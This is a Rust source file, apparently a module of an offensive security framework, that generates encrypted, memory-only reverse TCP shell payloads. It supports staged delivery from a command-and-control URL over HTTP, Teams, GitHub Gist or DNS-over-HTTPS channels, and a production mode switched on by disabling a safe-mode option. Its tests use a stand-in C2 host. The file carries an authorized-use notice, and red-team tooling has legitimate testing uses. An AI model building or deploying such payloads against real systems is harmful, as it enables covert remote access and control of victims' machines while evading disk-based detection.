//! Fileless Reverse TCP Payload Module
//!
//! Generates encrypted, memory-only reverse TCP payloads that connect back
//! to a listener without writing to disk. Integrates with the Smart Payload
//! Engine for encryption and C2 channel delivery.
//!
//! **SECURITY NOTICE**: This module is designed for AUTHORIZED penetration
//! testing, red team exercises, and security research ONLY.
//!
//! Features:
//! - Fileless execution (memory-only)
//! - AES-256-GCM encryption
//! - Base64 output for C2 delivery
//! - Multi-stage support (Stage-1 + Stage-2)
//! - Cross-platform (Windows/Linux/macOS)
//! - OS auto-detection or manual selection
//!
//! Options:
//! - LHOST: Listener host address (required)
//! - LPORT: Listener port (default: 4444)
//! - TARGET_OS: Target OS (windows/linux/macos/any)
//! - ENCRYPTION_KEY: Custom encryption passphrase
//! - STAGED: Enable multi-stage delivery (true/false)
//! - C2_URL: C2 URL for staged payload delivery
//! - OUTPUT_FORMAT: Output format (base64/hex/raw)

use anyhow::{bail, Result};
use async_trait::async_trait;
use base64::Engine;
use std::collections::HashMap;

use crate::core::module::{
    CheckResult, Module, ModuleInfo, ModuleOption, ModuleResult, ModuleType,
};
use crate::core::payload::Architecture;
use crate::core::payload_engine::{C2Channel, PayloadEngine, StagerConfig, TargetOS};

/// Fileless Reverse TCP Payload Module
pub struct FilelessRevTcp {
    options: HashMap<String, String>,
    engine: Option<PayloadEngine>,
}

impl FilelessRevTcp {
    pub fn new() -> Self {
        let mut options = HashMap::new();
        options.insert("LHOST".to_string(), String::new());
        options.insert("LPORT".to_string(), "4444".to_string());
        options.insert("TARGET_OS".to_string(), "any".to_string());
        options.insert("ARCHITECTURE".to_string(), "any".to_string());
        options.insert("ENCRYPTION_KEY".to_string(), String::new());
        options.insert("STAGED".to_string(), "false".to_string());
        options.insert("C2_URL".to_string(), String::new());
        options.insert("C2_CHANNEL".to_string(), "http".to_string());
        options.insert("OUTPUT_FORMAT".to_string(), "base64".to_string());
        options.insert("SAFE_MODE".to_string(), "true".to_string());

        Self {
            options,
            engine: None,
        }
    }

    fn get_option_or(&self, name: &str, default: &str) -> String {
        self.options
            .get(name)
            .filter(|v| !v.is_empty())
            .cloned()
            .unwrap_or_else(|| default.to_string())
    }

    fn is_staged(&self) -> bool {
        self.get_option_or("STAGED", "false")
            .to_lowercase()
            .parse()
            .unwrap_or(false)
    }

    fn is_safe_mode(&self) -> bool {
        self.get_option_or("SAFE_MODE", "true")
            .to_lowercase()
            .parse()
            .unwrap_or(true)
    }

    fn parse_target_os(&self) -> Result<TargetOS> {
        self.get_option_or("TARGET_OS", "any").parse()
    }

    fn parse_architecture(&self) -> Architecture {
        match self.get_option_or("ARCHITECTURE", "any").to_lowercase().as_str() {
            "x64" | "amd64" | "x86_64" => Architecture::X64,
            "x86" | "i386" | "i686" => Architecture::X86,
            "arm64" | "aarch64" => Architecture::ARM64,
            "arm" | "armv7" => Architecture::ARM,
            _ => Architecture::Any,
        }
    }

    fn parse_c2_channel(&self) -> C2Channel {
        match self.get_option_or("C2_CHANNEL", "http").to_lowercase().as_str() {
            "teams" => C2Channel::Teams,
            "github" | "gist" => C2Channel::GitHubGist,
            "dns" | "doh" => C2Channel::DnsOverHttps,
            "tcp" | "direct" => C2Channel::DirectTcp,
            _ => C2Channel::HttpBeacon,
        }
    }

    fn initialize_engine(&mut self) -> Result<()> {
        let key = self.get_option_or("ENCRYPTION_KEY", "ferox-payload-default");
        let mut engine = PayloadEngine::from_passphrase(&key)?;

        // Configure engine
        engine.set_target_os(self.parse_target_os()?);
        engine.set_architecture(self.parse_architecture());

        // Enable production mode if safe_mode is disabled
        if !self.is_safe_mode() {
            engine.enable_production_mode();
        }

        self.engine = Some(engine);
        Ok(())
    }
}

impl Default for FilelessRevTcp {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Module for FilelessRevTcp {
    fn info(&self) -> ModuleInfo {
        ModuleInfo {
            name: "rev_tcp_fileless".to_string(),
            version: "1.0.0".to_string(),
            author: "Ferox Team".to_string(),
            description: "Fileless reverse TCP payload with AES-256-GCM encryption. \
                         Executes entirely in memory without disk writes. \
                         Supports multi-stage delivery via C2 channels."
                .to_string(),
            module_type: ModuleType::Payload,
            category: "payloads".to_string(),
        }
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "LHOST".to_string(),
                description: "Listener host address for reverse connection".to_string(),
                required: true,
                default_value: None,
                current_value: self.options.get("LHOST").cloned(),
            },
            ModuleOption {
                name: "LPORT".to_string(),
                description: "Listener port number".to_string(),
                required: false,
                default_value: Some("4444".to_string()),
                current_value: self.options.get("LPORT").cloned(),
            },
            ModuleOption {
                name: "TARGET_OS".to_string(),
                description: "Target OS: windows, linux, macos, any".to_string(),
                required: false,
                default_value: Some("any".to_string()),
                current_value: self.options.get("TARGET_OS").cloned(),
            },
            ModuleOption {
                name: "ARCHITECTURE".to_string(),
                description: "Target architecture: x64, x86, arm64, arm, any".to_string(),
                required: false,
                default_value: Some("any".to_string()),
                current_value: self.options.get("ARCHITECTURE").cloned(),
            },
            ModuleOption {
                name: "ENCRYPTION_KEY".to_string(),
                description: "Custom encryption passphrase (default: auto-generated)".to_string(),
                required: false,
                default_value: None,
                current_value: self.options.get("ENCRYPTION_KEY").cloned(),
            },
            ModuleOption {
                name: "STAGED".to_string(),
                description: "Enable multi-stage delivery: true/false".to_string(),
                required: false,
                default_value: Some("false".to_string()),
                current_value: self.options.get("STAGED").cloned(),
            },
            ModuleOption {
                name: "C2_URL".to_string(),
                description: "C2 URL for staged payload delivery".to_string(),
                required: false,
                default_value: None,
                current_value: self.options.get("C2_URL").cloned(),
            },
            ModuleOption {
                name: "C2_CHANNEL".to_string(),
                description: "C2 channel: http, teams, github, dns".to_string(),
                required: false,
                default_value: Some("http".to_string()),
                current_value: self.options.get("C2_CHANNEL").cloned(),
            },
            ModuleOption {
                name: "OUTPUT_FORMAT".to_string(),
                description: "Output format: base64, hex, raw".to_string(),
                required: false,
                default_value: Some("base64".to_string()),
                current_value: self.options.get("OUTPUT_FORMAT").cloned(),
            },
            ModuleOption {
                name: "SAFE_MODE".to_string(),
                description: "Safe mode generates reference payloads only: true/false".to_string(),
                required: false,
                default_value: Some("true".to_string()),
                current_value: self.options.get("SAFE_MODE").cloned(),
            },
        ]
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<()> {
        let name_upper = name.to_uppercase();
        if !self.options.contains_key(&name_upper) {
            bail!("Unknown option: {}", name);
        }
        self.options.insert(name_upper, value.to_string());
        Ok(())
    }

    fn get_option(&self, name: &str) -> Option<String> {
        self.options.get(&name.to_uppercase()).cloned()
    }

    fn validate(&self) -> Result<()> {
        // LHOST is required
        let lhost = self.options.get("LHOST").cloned().unwrap_or_default();
        if lhost.is_empty() {
            bail!("LHOST is required");
        }

        // Validate LPORT
        let lport = self.get_option_or("LPORT", "4444");
        let port: u16 = lport.parse().map_err(|_| anyhow::anyhow!("Invalid LPORT: {}", lport))?;
        if port == 0 {
            bail!("LPORT cannot be 0");
        }

        // If staged, C2_URL is required
        if self.is_staged() {
            let c2_url = self.options.get("C2_URL").cloned().unwrap_or_default();
            if c2_url.is_empty() {
                bail!("C2_URL is required when STAGED=true");
            }
        }

        // Validate TARGET_OS
        self.parse_target_os()?;

        Ok(())
    }

    async fn check(&self) -> Result<CheckResult> {
        // Payload modules don't have a traditional "check" - return info about configuration
        let target_os = self.parse_target_os().unwrap_or(TargetOS::Any);
        let arch = self.parse_architecture();

        let mut fingerprint = HashMap::new();
        fingerprint.insert("target_os".to_string(), target_os.to_string());
        fingerprint.insert("architecture".to_string(), format!("{:?}", arch));
        fingerprint.insert("staged".to_string(), self.is_staged().to_string());
        fingerprint.insert("safe_mode".to_string(), self.is_safe_mode().to_string());

        Ok(CheckResult {
            vulnerable: true, // Payload is "ready" to generate
            confidence: 1.0,
            details: format!(
                "Payload configured for {} ({:?}), staged={}, safe_mode={}",
                target_os,
                arch,
                self.is_staged(),
                self.is_safe_mode()
            ),
            fingerprint,
        })
    }

    async fn run(&mut self) -> Result<ModuleResult> {
        // Initialize the payload engine
        self.initialize_engine()?;

        let engine = self
            .engine
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("PayloadEngine not initialized"))?;

        let lhost = self.options.get("LHOST").cloned().unwrap_or_default();
        let lport: u16 = self.get_option_or("LPORT", "4444").parse()?;
        let output_format = self.get_option_or("OUTPUT_FORMAT", "base64").to_lowercase();

        let result = if self.is_staged() {
            // Generate staged payload (Stage-1 stager)
            let c2_url = self.options.get("C2_URL").cloned().unwrap_or_default();
            let config = StagerConfig {
                c2_url: c2_url.clone(),
                c2_channel: self.parse_c2_channel(),
                stage2_key: self.options.get("ENCRYPTION_KEY").cloned(),
                ..Default::default()
            };

            let stager = engine.generate_stager(&config)?;

            // Also generate Stage-2 for reference
            let stage2_key = stager
                .stage
                .next_stage_key
                .clone()
                .unwrap_or_else(|| "default-stage2-key".to_string());
            let stage2 = engine.generate_stage2(&lhost, lport, &stage2_key)?;

            // Return both stages info
            let mut data = HashMap::new();
            data.insert(
                "stage1_payload".to_string(),
                serde_json::json!(match output_format.as_str() {
                    "hex" => stager.hex.clone(),
                    "raw" => base64::engine::general_purpose::STANDARD.encode(&stager.data),
                    _ => stager.base64.clone(),
                }),
            );
            data.insert(
                "stage1_size".to_string(),
                serde_json::json!(stager.metadata.size),
            );
            data.insert(
                "stage1_checksum".to_string(),
                serde_json::json!(stager.metadata.checksum_sha256),
            );
            data.insert(
                "stage2_key".to_string(),
                serde_json::json!(stage2_key),
            );
            data.insert(
                "stage2_payload".to_string(),
                serde_json::json!(match output_format.as_str() {
                    "hex" => stage2.hex.clone(),
                    "raw" => base64::engine::general_purpose::STANDARD.encode(&stage2.data),
                    _ => stage2.base64.clone(),
                }),
            );
            data.insert(
                "stage2_size".to_string(),
                serde_json::json!(stage2.metadata.size),
            );
            data.insert(
                "c2_url".to_string(),
                serde_json::json!(c2_url),
            );
            data.insert(
                "c2_channel".to_string(),
                serde_json::json!(format!("{:?}", self.parse_c2_channel())),
            );
            data.insert(
                "encrypted".to_string(),
                serde_json::json!(true),
            );
            data.insert(
                "safe_mode".to_string(),
                serde_json::json!(self.is_safe_mode()),
            );

            ModuleResult {
                success: true,
                message: format!(
                    "Staged payload generated: Stage-1 ({} bytes) + Stage-2 ({} bytes)",
                    stager.metadata.size, stage2.metadata.size
                ),
                data,
                timestamp: chrono::Utc::now(),
                session_id: None,
            }
        } else {
            // Generate single-stage payload
            let payload = engine.generate_reverse_tcp(&lhost, lport)?;

            let mut data = HashMap::new();
            data.insert(
                "payload".to_string(),
                serde_json::json!(match output_format.as_str() {
                    "hex" => payload.hex.clone(),
                    "raw" => base64::engine::general_purpose::STANDARD.encode(&payload.data),
                    _ => payload.base64.clone(),
                }),
            );
            data.insert("size".to_string(), serde_json::json!(payload.metadata.size));
            data.insert(
                "checksum".to_string(),
                serde_json::json!(payload.metadata.checksum_sha256),
            );
            data.insert(
                "target_os".to_string(),
                serde_json::json!(payload.metadata.target_os.to_string()),
            );
            data.insert(
                "architecture".to_string(),
                serde_json::json!(format!("{:?}", payload.metadata.architecture)),
            );
            data.insert(
                "encrypted".to_string(),
                serde_json::json!(payload.metadata.encrypted),
            );
            data.insert(
                "format".to_string(),
                serde_json::json!(output_format),
            );
            data.insert(
                "safe_mode".to_string(),
                serde_json::json!(self.is_safe_mode()),
            );
            data.insert(
                "lhost".to_string(),
                serde_json::json!(lhost),
            );
            data.insert(
                "lport".to_string(),
                serde_json::json!(lport),
            );

            ModuleResult {
                success: true,
                message: format!(
                    "Fileless reverse TCP payload generated: {} bytes, encrypted={}, target={}:{}, os={}, safe_mode={}",
                    payload.metadata.size,
                    payload.metadata.encrypted,
                    lhost,
                    lport,
                    payload.metadata.target_os,
                    self.is_safe_mode()
                ),
                data,
                timestamp: chrono::Utc::now(),
                session_id: None,
            }
        };

        Ok(result)
    }

    async fn cleanup(&mut self) -> Result<()> {
        // Clear the engine and any sensitive data
        self.engine = None;
        Ok(())
    }

    fn requires_confirmation(&self) -> bool {
        // Require confirmation if not in safe mode
        !self.is_safe_mode()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_creation() {
        let module = FilelessRevTcp::new();
        let info = module.info();

        assert_eq!(info.name, "rev_tcp_fileless");
        assert_eq!(info.module_type, ModuleType::Payload);
        assert_eq!(info.category, "payloads");
    }

    #[test]
    fn test_options() {
        let module = FilelessRevTcp::new();
        let options = module.options();

        assert!(options.iter().any(|o| o.name == "LHOST"));
        assert!(options.iter().any(|o| o.name == "LPORT"));
        assert!(options.iter().any(|o| o.name == "TARGET_OS"));
        assert!(options.iter().any(|o| o.name == "STAGED"));
    }

    #[test]
    fn test_set_option() {
        let mut module = FilelessRevTcp::new();

        module.set_option("LHOST", "192.168.1.100").unwrap();
        assert_eq!(module.get_option("LHOST"), Some("192.168.1.100".to_string()));

        module.set_option("lport", "8080").unwrap();
        assert_eq!(module.get_option("LPORT"), Some("8080".to_string()));
    }

    #[test]
    fn test_validation() {
        let mut module = FilelessRevTcp::new();

        // Should fail without LHOST
        assert!(module.validate().is_err());

        // Should pass with LHOST
        module.set_option("LHOST", "192.168.1.100").unwrap();
        assert!(module.validate().is_ok());
    }

    #[test]
    fn test_staged_validation() {
        let mut module = FilelessRevTcp::new();
        module.set_option("LHOST", "192.168.1.100").unwrap();
        module.set_option("STAGED", "true").unwrap();

        // Should fail without C2_URL when staged
        assert!(module.validate().is_err());

        // Should pass with C2_URL
        module.set_option("C2_URL", "https://c2.example.com/stage2").unwrap();
        assert!(module.validate().is_ok());
    }

    #[tokio::test]
    async fn test_run_single_stage() {
        let mut module = FilelessRevTcp::new();
        module.set_option("LHOST", "192.168.1.100").unwrap();
        module.set_option("LPORT", "4444").unwrap();

        let result = module.run().await.unwrap();

        assert!(result.success);
        assert!(result.data.contains_key("payload"));
        assert!(result.data.contains_key("size"));
        assert!(result.data.contains_key("checksum"));
    }

    #[tokio::test]
    async fn test_run_staged() {
        let mut module = FilelessRevTcp::new();
        module.set_option("LHOST", "192.168.1.100").unwrap();
        module.set_option("STAGED", "true").unwrap();
        module.set_option("C2_URL", "https://c2.example.com/stage2").unwrap();

        let result = module.run().await.unwrap();

        assert!(result.success);
        assert!(result.data.contains_key("stage1_payload"));
        assert!(result.data.contains_key("stage2_payload"));
        assert!(result.data.contains_key("stage2_key"));
    }

    #[tokio::test]
    async fn test_check() {
        let mut module = FilelessRevTcp::new();
        module.set_option("LHOST", "192.168.1.100").unwrap();
        module.set_option("TARGET_OS", "linux").unwrap();

        let check = module.check().await.unwrap();

        assert!(check.vulnerable);
        assert_eq!(check.fingerprint.get("target_os"), Some(&"linux".to_string()));
    }

    #[test]
    fn test_safe_mode_default() {
        let module = FilelessRevTcp::new();
        assert!(module.is_safe_mode());
    }

    #[test]
    fn test_requires_confirmation() {
        let mut module = FilelessRevTcp::new();

        // Safe mode doesn't require confirmation
        assert!(!module.requires_confirmation());

        // Production mode requires confirmation
        module.set_option("SAFE_MODE", "false").unwrap();
        assert!(module.requires_confirmation());
    }
}
